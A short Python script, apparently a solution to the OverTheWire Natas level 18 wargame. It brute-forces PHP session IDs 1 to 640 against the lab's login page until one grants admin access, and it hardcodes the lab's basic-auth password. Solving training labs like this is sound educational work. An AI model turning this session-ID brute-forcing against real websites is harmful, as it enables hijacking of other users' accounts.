#!/bin/python
import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas18.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
cookie_id_range = range(1, 641)
payload = {'username': 'admin', 'password': ''}

for cookie_id in cookie_id_range:
    cookies = {'PHPSESSID': str(cookie_id)}

    response = requests.post(url, data=payload, cookies=cookies, auth=auth, headers=headers)

    if 'You are an admin' in response.text:
        print(f'Login successful with Cookie ID: {cookie_id}')
        print(response.text)
        break
    else:
        print(f'{cookie_id} failed')
